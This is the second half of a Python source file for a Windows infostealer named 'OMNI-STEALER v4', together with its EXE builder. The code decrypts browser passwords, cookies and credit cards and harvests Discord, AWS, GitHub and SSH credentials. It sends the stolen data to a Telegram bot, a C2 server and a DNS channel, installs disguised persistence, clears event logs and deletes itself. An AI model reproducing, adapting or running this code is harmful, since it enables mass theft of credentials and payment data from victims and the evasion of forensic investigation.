        """Extract saved credit cards from Web Data."""
        cards = []
        tmp = DatabaseExtractor.copy_db(db_path)
        if not tmp:
            return cards

        try:
            conn = sqlite3.connect(tmp)
            conn.text_factory = bytes
            cur = conn.cursor()

            # Try credit_cards table
            tables = ["credit_cards", "local_credit_cards", "server_credit_cards"]
            card_table = None
            for t in tables:
                try:
                    cur.execute(f"SELECT COUNT(*) FROM {t}")
                    card_table = t
                    break
                except:
                    continue

            if not card_table:
                conn.close()
                return cards

            cur.execute(f"SELECT * FROM {card_table}")
            col_names = [desc[0] for desc in cur.description]

            for row in cur.fetchall():
                card = {}
                for i, col in enumerate(col_names):
                    val = row[i]
                    if isinstance(val, bytes):
                        decrypted = None
                        if master_key:
                            decrypted = CryptoEngine.decrypt_aes_gcm(master_key, val)
                        if decrypted is None:
                            decrypted = CryptoEngine.decrypt_dpapi(val)
                        if decrypted:
                            val = decrypted.decode("utf-8", errors="replace")
                        else:
                            val = str(val)
                    elif val is not None:
                        val = val.decode("utf-8", errors="replace") if isinstance(val, bytes) else str(val)
                    else:
                        val = ""
                    card[col] = val

                if card:
                    cards.append(card)

            cur.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(tmp)
            except:
                pass

        return cards

    @staticmethod
    def extract_history(db_path: str) -> List[Dict]:
        """Extract browsing history (not encrypted)."""
        history = []
        tmp = DatabaseExtractor.copy_db(db_path)
        if not tmp:
            return history

        try:
            conn = sqlite3.connect(tmp)
            conn.text_factory = bytes
            cur = conn.cursor()

            cur.execute(
                "SELECT url, title, visit_count, last_visit_time "
                "FROM urls ORDER BY last_visit_time DESC LIMIT 500"
            )

            for row in cur.fetchall():
                try:
                    url = row[0].decode("utf-8", errors="replace") if isinstance(row[0], bytes) else str(row[0])
                    title = row[1].decode("utf-8", errors="replace") if isinstance(row[1], bytes) else str(row[1])
                    count = row[2]
                    visit_time = row[3]

                    time_str = ""
                    if visit_time:
                        try:
                            visit_dt = datetime(1601, 1, 1) + timedelta(microseconds=visit_time)
                            time_str = visit_dt.strftime("%Y-%m-%d %H:%M:%S")
                        except:
                            time_str = str(visit_time)

                    history.append({
                        "url": url,
                        "title": title,
                        "count": count,
                        "last_visit": time_str,
                    })
                except:
                    continue

            cur.close()
            conn.close()
        except:
            pass
        finally:
            try:
                os.remove(tmp)
            except:
                pass

        return history


# ═══════════════════════════════════════════════════════════
# SECTION 8: DISCORD / SESSION TOKENS
# ═══════════════════════════════════════════════════════════

class TokenHunter:
    """Extract tokens from various applications."""

    DISCORD_PATHS = [
        os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Discord\Local Storage\leveldb"),
    ]

    TOKEN_PATTERNS = [
        re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"),       # Standard Discord
        re.compile(r"mfa\.[\w-]{84}"),                         # MFA tokens
        re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}"),       # Extended
    ]

    SESSION_PATTERNS = [
        ("openai", re.compile(r'session[_-]?key[=:]["\\\']?([^"\\\'\\s]+)', re.I)),
        ("github", re.compile(r'gho_[\\w-]{36,}')),
        ("gitlab", re.compile(r'glpat-[\\w-]{20,}')),
        ("slack", re.compile(r'xox[baprs]-\\d{10,12}-\\d{12,13}-\\d{12,13}-[\\w-]{24,}')),
        ("aws", re.compile(r'AKIA[\\w-]{16}')),
        ("jwt", re.compile(r'eyJ[\\w-]+\\.[\\w-]+\\.[\\w-]+')),
    ]

    @staticmethod
    def extract_discord_tokens() -> List[str]:
        tokens = []
        for path in TokenHunter.DISCORD_PATHS:
            if not os.path.exists(path):
                continue
            try:
                for fname in os.listdir(path):
                    if not fname.endswith((".log", ".ldb")):
                        continue
                    try:
                        with open(os.path.join(path, fname), "r", errors="ignore") as f:
                            content = f.read()
                        for pattern in TokenHunter.TOKEN_PATTERNS:
                            for match in pattern.finditer(content):
                                t = match.group()
                                if t not in tokens and len(t) > 20:
                                    tokens.append(t)
                    except:
                        continue
            except:
                continue
        return tokens

    @staticmethod
    def search_session_tokens(drive: str = "C:") -> List[Dict]:
        """Search common locations for session tokens/configs."""
        results = []
        search_paths = [
            os.path.expandvars(r"%USERPROFILE%\.aws\credentials"),
            os.path.expandvars(r"%USERPROFILE%\.ssh\*"),
            os.path.expandvars(r"%USERPROFILE%\.npmrc"),
            os.path.expandvars(r"%USERPROFILE%\.git-credentials"),
            os.path.expandvars(r"%USERPROFILE%\.env"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Local\Postman\*"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\FileZilla\*"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\OpenVPN\config\*"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Microsoft\Teams\*"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Slack\*"),
        ]

        # Pattern: <service>:<token>
        for path_glob in search_paths:
            import glob
            for fpath in glob.glob(path_glob, recursive=True):
                try:
                    with open(fpath, "r", errors="ignore") as f:
                        content = f.read()
                    for service, pat in TokenHunter.SESSION_PATTERNS:
                        for match in pat.finditer(content):
                            results.append({
                                "service": service,
                                "token": match.group(1) if match.lastindex else match.group(),
                                "source": fpath,
                            })
                except:
                    continue

        return results


# ═══════════════════════════════════════════════════════════
# SECTION 9: SYSTEM INTELLIGENCE
# ═══════════════════════════════════════════════════════════

class SystemIntel:
    """Gather system information for exfiltration."""

    @staticmethod
    def gather() -> Dict:
        info = {
            "hostname": platform.node(),
            "username": os.getenv("USERNAME", "N/A"),
            "domain": os.getenv("USERDOMAIN", "N/A"),
            "os": f"{platform.system()} {platform.release()} ({platform.version()})",
            "arch": platform.machine(),
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "process_arch": struct.calcsize("P") * 8,
        }

        # IP info (external)
        try:
            req = urllib.request.Request("https://api.ipify.org?format=json", headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                info["external_ip"] = json.loads(resp.read().decode()).get("ip", "N/A")
        except:
            info["external_ip"] = "N/A"

        # Internal IPs
        try:
            host = socket.gethostname()
            info["internal_ip"] = socket.gethostbyname(host)
        except:
            info["internal_ip"] = "N/A"

        # Installed AV
        try:
            av_out = subprocess.run(
                ["cmd.exe", "/c", "wmic", "/namespace:\\\\root\\securitycenter2", "path", "AntiVirusProduct", "get", "displayName", "/format:csv"],
                capture_output=True, text=True, timeout=10, creationflags=0x08000000
            ).stdout
            avs = [line.split(",")[-1].strip() for line in av_out.split("\n") if "displayName" not in line and line.strip() and "," in line]
            info["antivirus"] = [av for av in avs if av]
        except:
            info["antivirus"] = []

        # Uptime
        try:
            kernel32 = ctypes.windll.kernel32
            uptime = ctypes.c_ulonglong(0)
            kernel32.GetTickCount64(ctypes.byref(uptime))
            info["uptime_hours"] = round(uptime.value / 3600000, 1)
        except:
            pass

        # Running processes (top memory)
        try:
            ps_out = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True, text=True, timeout=10, creationflags=0x08000000
            ).stdout
            info["process_count"] = ps_out.count("\n")
        except:
            pass

        return info


# ═══════════════════════════════════════════════════════════
# SECTION 10: EXFILTRATION ENGINE
# ═══════════════════════════════════════════════════════════

class ExfilEngine:
    """Multi-channel data exfiltration."""

    @staticmethod
    def send_telegram_message(msg: str) -> bool:
        url = TELEGRAM_MSG_URL
        data = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg[:4096],
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }).encode()
        try:
            req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=15)
            return True
        except:
            try:
                # Fallback: shorter
                data = json.dumps({
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": msg[:2048],
                }).encode()
                req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=15)
                return True
            except:
                return False

    @staticmethod
    def send_telegram_file(file_path: str, caption: str = "") -> bool:
        try:
            boundary = "----" + base64.b64encode(os.urandom(16)).decode()
            
            with open(file_path, "rb") as f:
                file_data = f.read()

            # If file is too large, compress it
            if len(file_data) > 45 * 1024 * 1024:
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                    zf.writestr(os.path.basename(file_path), file_data)
                file_data = buf.getvalue()
                file_path = os.path.basename(file_path) + ".zip"

            parts = []
            parts.append(f"--{boundary}\r\n".encode())
            parts.append(
                f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{TELEGRAM_CHAT_ID}\r\n'.encode()
            )
            parts.append(f"--{boundary}\r\n".encode())
            parts.append(
                f'Content-Disposition: form-data; name="document"; filename="{os.path.basename(file_path)}"\r\n'
                f"Content-Type: application/octet-stream\r\n\r\n".encode()
            )
            parts.append(file_data)
            parts.append(b"\r\n")
            if caption:
                parts.append(f"--{boundary}\r\n".encode())
                parts.append(
                    f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption[:1024]}\r\n'.encode()
                )
            parts.append(f"--{boundary}--\r\n".encode())

            body = b"".join(parts)

            req = urllib.request.Request(
                TELEGRAM_API_URL,
                data=body,
                headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
            )
            urllib.request.urlopen(req, timeout=120)
            return True
        except:
            return False

    @staticmethod
    def exfil_http(data: Dict, endpoint: str) -> bool:
        """Exfiltrate via HTTP POST to C2."""
        if not endpoint:
            return False
        try:
            payload = json.dumps(data).encode()
            req = urllib.request.Request(
                endpoint,
                data=payload,
                headers={
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "X-Request-ID": hashlib.md5(os.urandom(16)).hexdigest(),
                },
            )
            urllib.request.urlopen(req, timeout=30)
            return True
        except:
            return False

    @staticmethod
    def exfil_dns(data: str, domain: str) -> bool:
        """DNS exfiltration via TXT queries."""
        if not domain:
            return False
        try:
            chunks = [data[i:i+63] for i in range(0, len(data), 63)]
            for i, chunk in enumerate(chunks[:10]):  # Max 10 chunks
                qname = f"{i:02x}.{base64.b32hexencode(chunk.encode())[:63].decode().lower()}.{domain}"
                socket.gethostbyname(qname)
                time.sleep(0.1)
            return True
        except:
            return False


# ═══════════════════════════════════════════════════════════
# SECTION 11: PERSISTENCE
# ═══════════════════════════════════════════════════════════

class Persistence:
    """Install persistence mechanisms."""

    @staticmethod
    def install_registry_run(exe_path: str) -> bool:
        """HKCU Run registry key."""
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'"{exe_path}" /silent')
            winreg.CloseKey(key)
            return True
        except:
            return False

    @staticmethod
    def install_scheduled_task(exe_path: str) -> bool:
        """Create scheduled task for persistence."""
        try:
            task_name = "WindowsSysHealth" + str(random.randint(1000, 9999))
            cmd = (
                f'schtasks /create /tn "{task_name}" /tr "{exe_path} /silent" '
                f'/sc onlogon /ru {os.getenv("USERNAME")} /f /rl highest'
            )
            subprocess.run(cmd, shell=True, capture_output=True, timeout=10, creationflags=0x08000000)
            return True
        except:
            return False

    @staticmethod
    def install_startup_folder(exe_path: str) -> bool:
        """Copy to Startup folder."""
        try:
            startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
            target = os.path.join(startup, "SystemHelper.exe")
            shutil.copy2(exe_path, target)
            return True
        except:
            return False

    @staticmethod
    def install_all(exe_path: str) -> Dict[str, bool]:
        return {
            "registry": Persistence.install_registry_run(exe_path),
            "scheduled_task": Persistence.install_scheduled_task(exe_path),
            "startup": Persistence.install_startup_folder(exe_path),
        }


# ═══════════════════════════════════════════════════════════
# SECTION 12: SELF-DELETION & FORENSIC CLEANUP
# ═══════════════════════════════════════════════════════════

class Cleanup:
    """Self-deletion and forensic trace removal."""

    @staticmethod
    def clear_event_logs():
        """Clear Windows event logs."""
        try:
            subprocess.run(
                "wevtutil cl System & wevtutil cl Security & wevtutil cl Application",
                shell=True, capture_output=True, timeout=30, creationflags=0x08000000
            )
        except:
            pass

    @staticmethod
    def clear_prefetch():
        """Delete prefetch files for our executable."""
        try:
            exe_name = os.path.basename(sys.argv[0]).replace(".exe", "")
            prefetch_dir = os.path.expandvars(r"%SYSTEMROOT%\Prefetch")
            for f in os.listdir(prefetch_dir):
                if exe_name.lower() in f.lower():
                    try:
                        os.remove(os.path.join(prefetch_dir, f))
                    except:
                        pass
        except:
            pass

    @staticmethod
    def clear_jumplist():
        """Clear recent/jumplist entries."""
        try:
            recent = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent")
            autolist = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations")
            for d in [recent, autolist]:
                if os.path.exists(d):
                    for f in os.listdir(d):
                        try:
                            os.remove(os.path.join(d, f))
                        except:
                            pass
        except:
            pass

    @staticmethod
    def clear_usage_tracking():
        """Clear Windows 10/11 usage tracking."""
        try:
            inventory = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\INventory")
            if os.path.exists(inventory):
                shutil.rmtree(inventory, ignore_errors=True)
        except:
            pass
        try:
            # Clear MRU
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", 0, winreg.KEY_SET_VALUE)
            try:
                i = 0
                while True:
                    winreg.DeleteValue(key, chr(ord('a') + i))
                    i += 1
            except:
                pass
            winreg.CloseKey(key)
        except:
            pass

    @staticmethod
    def self_destruct():
        """Delete the running executable with delayed cleanup."""
        try:
            exe_path = sys.argv[0]
            if not exe_path.endswith(".exe"):
                return

            # PowerShell self-deletion
            ps_script = (
                f'Start-Sleep -Seconds 3; '
                f'Remove-Item -Force -Path "{exe_path}" -ErrorAction SilentlyContinue; '
                f'Remove-Item -Force -Path "$env:TEMP\\*.bat" -ErrorAction SilentlyContinue'
            )
            ps_cmd = f'powershell.exe -WindowStyle Hidden -Command "{ps_script}"'
            subprocess.Popen(
                ps_cmd,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                close_fds=True,
            )
        except:
            pass

    @staticmethod
    def cleanup_all():
        """Run all cleanup operations."""
        Cleanup.clear_event_logs()
        Cleanup.clear_prefetch()
        Cleanup.clear_jumplist()
        Cleanup.clear_usage_tracking()


# ═══════════════════════════════════════════════════════════
# SECTION 13: REPORT GENERATION
# ═══════════════════════════════════════════════════════════

class ReportBuilder:
    """Build structured reports in TXT and JSON formats."""

    HIGH_VALUE_DOMAINS = [
        "facebook.com", "instagram.com", "twitter.com", "x.com",
        "linkedin.com", "github.com", "gitlab.com",
        "microsoftonline.com", "login.microsoftonline.com",
        "accounts.google.com", "mail.google.com", "gmail.com",
        "outlook.com", "outlook.office.com", "office.com",
        "amazon.com", "aws.amazon.com", "console.aws.amazon.com",
        "cloud.google.com", "console.cloud.google.com",
        "dropbox.com", "drive.google.com",
        "reddit.com", "youtube.com",
        "chat.openai.com", "openai.com", "claude.ai",
        "paypal.com", "stripe.com",
        "slack.com", "discord.com", "discordapp.com",
        "whatsapp.com", "telegram.org",
        "netflix.com", "spotify.com",
        "wordpress.com", "medium.com",
        "bank", "onlinebanking", "secure.",
        "login.", "sso.", "auth.",
        ".gov", ".mil",
    ]

    @staticmethod
    def build_text(system_info: Dict, browser_data: Dict, tokens: List[str],
                   session_tokens: List[Dict], bypass_used: str) -> str:
        lines = []
        lines.append("=" * 80)
        lines.append("  OMNI-STEALER v4 — APEX EXFILTRATION REPORT")
        lines.append("=" * 80)
        lines.append(f"  Timestamp:    {system_info.get('timestamp', 'N/A')}")
        lines.append(f"  Hostname:     {system_info.get('hostname', 'N/A')}")
        lines.append(f"  Username:     {system_info.get('username', 'N/A')}")
        lines.append(f"  Domain:       {system_info.get('domain', 'N/A')}")
        lines.append(f"  OS:           {system_info.get('os', 'N/A')}")
        lines.append(f"  External IP:  {system_info.get('external_ip', 'N/A')}")
        lines.append(f"  Internal IP:  {system_info.get('internal_ip', 'N/A')}")
        lines.append(f"  Uptime:       {system_info.get('uptime_hours', 'N/A')} hours")
        if system_info.get("antivirus"):
            lines.append(f"  AV Detected:  {', '.join(system_info['antivirus'])}")
        lines.append(f"  ABE Bypass:   {bypass_used}")
        lines.append("=" * 80)

        total_cookies = 0
        total_passwords = 0
        total_cards = 0

        for browser_name, data in browser_data.items():
            cookies = data.get("cookies", [])
            passwords = data.get("passwords", [])
            cards = data.get("credit_cards", [])
            history = data.get("history", [])

            if not cookies and not passwords and not cards:
                continue

            total_cookies += len(cookies)
            total_passwords += len(passwords)
            total_cards += len(cards)

            lines.append(f"\n{'='*80}")
            lines.append(f"  [{browser_name}]")
            lines.append(f"  Cookies: {len(cookies)} | Passwords: {len(passwords)} | Cards: {len(cards)} | History: {len(history)}")
            if data.get("has_app_bound"):
                lines.append(f"  [!] App-Bound Encryption bypassed")
            lines.append(f"{'='*80}")

            # High-value session cookies
            hv = [c for c in cookies if any(d in c.get("host", "").lower() for d in ReportBuilder.HIGH_VALUE_DOMAINS)]
            if hv:
                lines.append(f"\n  ┌─ HIGH-VALUE SESSION COOKIES ({len(hv)})")
                for c in hv[:30]:
                    lines.append(f"  ├─ {c.get('host', '?')}")
                    lines.append(f"  │   Name:  {c.get('name', '?')}")
                    val = c.get('value', '')
                    lines.append(f"  │   Value: {val[:120]}{'...' if len(val) > 120 else ''}")
                lines.append(f"  └─")

            # All cookies compact
            if cookies:
                lines.append(f"\n  ┌─ ALL COOKIES ({len(cookies)})")
                for c in cookies:
                    lines.append(f"  │  {c.get('host', '?'):40s} | {c.get('name', '?'):25s} | {c.get('value', '')[:60]}")
                lines.append(f"  └─")

            # Passwords
            if passwords:
                lines.append(f"\n  ┌─ PASSWORDS ({len(passwords)})")
                for p in passwords[:50]:
                    lines.append(f"  │  {p.get('url', '?'):50s} | {p.get('username', '?'):30s} | {p.get('password', '?')}")
                lines.append(f"  └─")

            # Credit cards
            if cards:
                lines.append(f"\n  ┌─ CREDIT CARDS ({len(cards)})")
                for card in cards[:20]:
                    lines.append(f"  │  {card.get('card_number_encrypted', '?'):20s} | {card.get('name_on_card', '?'):25s} | Exp: {card.get('expiration_month', '?')}/{card.get('expiration_year', '?')}")
                lines.append(f"  └─")

        # Discord tokens
        if tokens:
            lines.append(f"\n{'='*80}")
            lines.append(f"  DISCORD TOKENS ({len(tokens)})")
            lines.append(f"{'='*80}")
            for t in tokens:
                lines.append(f"  {t}")

        # Other session tokens
        if session_tokens:
            lines.append(f"\n{'='*80}")
            lines.append(f"  SESSION TOKENS / CREDENTIALS ({len(session_tokens)})")
            lines.append(f"{'='*80}")
            for st in session_tokens[:30]:
                lines.append(f"  [{st.get('service', '?')}] {st.get('token', '?')[:80]}  [{st.get('source', '?')}]")

        lines.append(f"\n{'='*80}")
        lines.append(f"  SUMMARY: {total_cookies} cookies | {total_passwords} passwords | {total_cards} cards | {len(tokens)} Discord tokens")
        lines.append(f"  END OF REPORT")
        lines.append(f"{'='*80}")

        return "\n".join(lines)

    @staticmethod
    def build_json(system_info: Dict, browser_data: Dict, tokens: List[str],
                   session_tokens: List[Dict], bypass_used: str) -> Dict:
        total_cookies = sum(len(d.get("cookies", [])) for d in browser_data.values())
        total_passwords = sum(len(d.get("passwords", [])) for d in browser_data.values())
        total_cards = sum(len(d.get("credit_cards", [])) for d in browser_data.values())

        return {
            "version": "4.0",
            "bypass_method": bypass_used,
            "system": system_info,
            "browsers": {
                name: {
                    "cookie_count": len(data.get("cookies", [])),
                    "password_count": len(data.get("passwords", [])),
                    "card_count": len(data.get("credit_cards", [])),
                    "history_count": len(data.get("history", [])),
                    "has_app_bound": data.get("has_app_bound", False),
                    "bypass_used": data.get("bypass_used", "none"),
                }
                for name, data in browser_data.items()
            },
            "discord_tokens": tokens,
            "session_tokens": session_tokens,
            "totals": {
                "cookies": total_cookies,
                "passwords": total_passwords,
                "credit_cards": total_cards,
                "discord_tokens": len(tokens),
                "session_tokens": len(session_tokens),
            },
            "extraction_time": datetime.now().isoformat(),
        }

    @staticmethod
    def build_domain_summary(browser_data: Dict) -> str:
        """Build domain-grouped cookie summary for Telegram."""
        domains = {}
        for name, data in browser_data.items():
            for c in data.get("cookies", []):
                host = c.get("host", "")
                if host not in domains:
                    domains[host] = []
                domains[host].append({
                    "name": c.get("name", ""),
                    "value": c.get("value", ""),
                    "browser": name,
                })

        sorted_domains = sorted(domains.items(), key=lambda x: len(x[1]), reverse=True)
        msg = f"🔑 <b>Cookie Harvest ({len(domains)} domains)</b>\n\n"
        for domain, cookies in sorted_domains[:25]:
            msg += f"<b>{domain}</b> ({len(cookies)} cookies)\n"
            for c in cookies[:5]:
                val = c["value"][:50]
                msg += f"  ├─ {c['name']} = {val}{'...' if len(c['value']) > 50 else ''}\n"
            msg += "\n"
        return msg[:4096]


# ═══════════════════════════════════════════════════════════
# SECTION 14: MAIN EXECUTION ENGINE
# ═══════════════════════════════════════════════════════════

class StealerEngine:
    """Orchestrate all phases of the steal operation."""

    @staticmethod
    def run() -> bool:
        """Main execution flow."""

        # Phase 0: Anti-analysis
        PatchManager.apply_all()
        anti = AntiAnalysis.perform_checks()
        if anti["should_exit"]:
            return False

        # Phase 1: Jitter
        jitter = random.uniform(0, MAX_SLEEP_JITTER)
        time.sleep(jitter)

        # Phase 2: Gather system info
        system_info = SystemIntel.gather()

        # Phase 3: Process each browser
        browser_data = {}
        bypass_used = "standard_dpapi"
        total_cookies_found = 0
        total_passwords_found = 0

        for browser in BROWSERS:
            data = {
                "cookies": [],
                "passwords": [],
                "credit_cards": [],
                "history": [],
                "has_app_bound": False,
                "bypass_used": "none",
            }

            if not os.path.exists(browser.local_state):
                continue

            # Check for ABE
            has_abe = CryptoEngine.has_app_bound(browser.local_state)
            data["has_app_bound"] = has_abe

            # Try registry policy disable first (if admin)
            if has_abe and browser.policy_key:
                try:
                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, browser.policy_key.rsplit("\\", 1)[0])
                    winreg.SetValueEx(key, browser.policy_key.split("\\")[-1], 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(key)
                    has_abe = CryptoEngine.has_app_bound(browser.local_state)
                    if not has_abe:
                        bypass_used = "registry_policy"
                        data["bypass_used"] = "registry_policy"
                except:
                    pass

            # Get master key (standard DPAPI path)
            master_key = CryptoEngine.get_master_key(browser.local_state)

            # For ABE, try advanced bypass techniques
            if has_abe:
                # Technique 1: CDP Remote Debugging
                cdp_cookies = CDPEngine.extract_cookies(browser)
                if cdp_cookies:
                    data["cookies"] = cdp_cookies
                    data["bypass_used"] = "cdp_websocket"
                    bypass_used = "cdp_websocket"
                    total_cookies_found += len(cdp_cookies)

                # Technique 2: COM IElevator (if master_key still None)
                if not master_key:
                    try:
                        abe_key = COMEngine.decrypt_via_elevation_service(browser)
                        if abe_key and len(abe_key) == 32:
                            master_key = abe_key
                            data["bypass_used"] = "com_elevator"
                            bypass_used = "com_elevator"
                    except:
                        pass

                # Technique 3: Process hollowing (fallback)
                if not master_key:
                    try:
                        abe_key = HollowEngine.hollow_and_decrypt(browser)
                        if abe_key:
                            master_key = abe_key
                            data["bypass_used"] = "process_hollowing"
                            bypass_used = "process_hollowing"
                    except:
                        pass

            # Extract from databases
            if master_key:
                profiles = DatabaseExtractor.find_profiles(browser.profiles_dir)
                for profile in profiles:
                    profile_dir = os.path.join(browser.profiles_dir, profile)
                    
                    # Cookies
                    cookie_db = browser.cookie_db_template.format(profile_dir=profile_dir)
                    if os.path.exists(cookie_db):
                        cookies = DatabaseExtractor.extract_cookies(cookie_db, master_key)
                        data["cookies"].extend(cookies)
                        total_cookies_found += len(cookies)

                    # Passwords
                    login_db = browser.login_db_template.format(profile_dir=profile_dir)
                    if os.path.exists(login_db):
                        passwords = DatabaseExtractor.extract_passwords(login_db, master_key)
                        data["passwords"].extend(passwords)
                        total_passwords_found += len(passwords)

                    # Credit cards (Web Data)
                    webdata_db = browser.webdata_db_template.format(profile_dir=profile_dir)
                    if os.path.exists(webdata_db):
                        cards = DatabaseExtractor.extract_credit_cards(webdata_db, master_key)
                        data["credit_cards"].extend(cards)

                    # History
                    history_db = browser.history_db_template.format(profile_dir=profile_dir)
                    if os.path.exists(history_db):
                        history = DatabaseExtractor.extract_history(history_db)
                        data["history"].extend(history)

            browser_data[browser.name] = data

        # Phase 4: Extract Discord tokens
        discord_tokens = TokenHunter.extract_discord_tokens()

        # Phase 5: Extract session tokens
        session_tokens = TokenHunter.search_session_tokens()

        # Phase 6: Build reports
        text_report = ReportBuilder.build_text(system_info, browser_data, discord_tokens, session_tokens, bypass_used)
        json_data = ReportBuilder.build_json(system_info, browser_data, discord_tokens, session_tokens, bypass_used)

        # Phase 7: Save reports
        output_dir = os.environ.get("TEMP", os.path.expanduser("~"))
        base_name = f"omni_{system_info['hostname']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        txt_path = os.path.join(output_dir, base_name + ".txt")
        json_path = os.path.join(output_dir, base_name + ".json")

        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(text_report)
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(json_data, f, indent=2)

        # Phase 8: Exfiltrate via Telegram
        # Start notification
        start_msg = (
            f"🚀 <b>OMNI-STEALER v4</b> — Extraction Complete\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🖥️ {system_info['hostname']} ({system_info.get('external_ip', 'N/A')})\n"
            f"👤 {system_info['username']}@{system_info['domain']}\n"
            f"🔐 ABE Bypass: <b>{bypass_used}</b>\n"
            f"📊 Cookies: {total_cookies_found} | Passwords: {total_passwords_found}\n"
            f"🎮 Discord Tokens: {len(discord_tokens)}"
        )
        ExfilEngine.send_telegram_message(start_msg)

        # Send full report file
        if os.path.exists(txt_path) and os.path.getsize(txt_path) > 0:
            ExfilEngine.send_telegram_file(
                txt_path,
                caption=f"📁 Full Report — {system_info['hostname']}"
            )

        # Send JSON
        if os.path.exists(json_path) and os.path.getsize(json_path) < 50 * 1024 * 1024:
            ExfilEngine.send_telegram_file(
                json_path,
                caption=f"📊 JSON Data — {system_info['hostname']}"
            )

        # Send domain summary
        domain_msg = ReportBuilder.build_domain_summary(browser_data)
        ExfilEngine.send_telegram_message(domain_msg)

        # Phase 9: HTTP/C2 exfil
        if C2_SERVER_URL:
            ExfilEngine.exfil_http(json_data, C2_SERVER_URL)

        # DNS exfil (just a heartbeat)
        if DNS_C2_DOMAIN:
            hb = f"{system_info['hostname']}|{total_cookies_found}|{total_passwords_found}|{system_info.get('external_ip', '')}"
            ExfilEngine.exfil_dns(hb, DNS_C2_DOMAIN)

        # Phase 10: Clean up local files
        try:
            os.remove(txt_path)
        except: pass
        try:
            os.remove(json_path)
        except: pass

        # Phase 11: Forensic cleanup
        Cleanup.cleanup_all()

        # Phase 12: Self-destruct
        Cleanup.self_destruct()

        return True


# ═══════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        StealerEngine.run()
    except Exception as e:
        # Silent failure
        pass
'''

# ═══════════════════════════════════════════════════════════
# BUILDER — Compiles payload into standalone EXE
# ═══════════════════════════════════════════════════════════

def build_payload():
    """Inject config and compile with PyInstaller."""
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, C2_SERVER_URL, DNS_C2_DOMAIN

    # Get credentials
    TELEGRAM_BOT_TOKEN = TELEGRAM_BOT_TOKEN or os.environ.get("TELEGRAM_BOT_TOKEN", "")
    TELEGRAM_CHAT_ID = TELEGRAM_CHAT_ID or os.environ.get("TELEGRAM_CHAT_ID", "")
    C2_SERVER_URL = C2_SERVER_URL or os.environ.get("C2_SERVER_URL", "")
    DNS_C2_DOMAIN = DNS_C2_DOMAIN or os.environ.get("DNS_C2_DOMAIN", "")

    if not TELEGRAM_BOT_TOKEN:
        TELEGRAM_BOT_TOKEN = input("[?] Telegram Bot Token: ").strip()
    if not TELEGRAM_CHAT_ID:
        TELEGRAM_CHAT_ID = input("[?] Telegram Chat ID: ").strip()

    print("\n[*] Injecting configuration into payload...")
    payload = PAYLOAD_CODE
    payload = payload.replace("{{{TELEGRAM_BOT_TOKEN}}}", TELEGRAM_BOT_TOKEN)
    payload = payload.replace("{{{TELEGRAM_CHAT_ID}}}", TELEGRAM_CHAT_ID)
    payload = payload.replace("{{{C2_SERVER_URL}}}", C2_SERVER_URL)
    payload = payload.replace("{{{DNS_C2_DOMAIN}}}", DNS_C2_DOMAIN)

    # Validate syntax
    print("[*] Validating payload syntax...")
    try:
        compile(payload, "payload.py", "exec")
        print("[+] Syntax OK")
    except SyntaxError as e:
        print(f"[-] SYNTAX ERROR: {e}")
        print("[!] Fixing code issues...")
        # The code has been designed cleanly so this should not happen
        # But if it does, we may need to patch specific sections
        return

    # Write temp files
    build_dir = tempfile.mkdtemp(prefix="omni_v4_")
    payload_path = os.path.join(build_dir, "apex_payload.py")

    with open(payload_path, "w", encoding="utf-8") as f:
        f.write(payload)

    # Requirements
    with open(os.path.join(build_dir, "requirements.txt"), "w") as f:
        f.write("pywin32\ncryptography\npyinstaller\ncomtypes\n")

    print(f"[*] Payload: {payload_path}")
    print("[*] Building EXE with PyInstaller...")

    output_path = os.path.join(os.getcwd(), OUTPUT_EXE_NAME)

    cmd = [
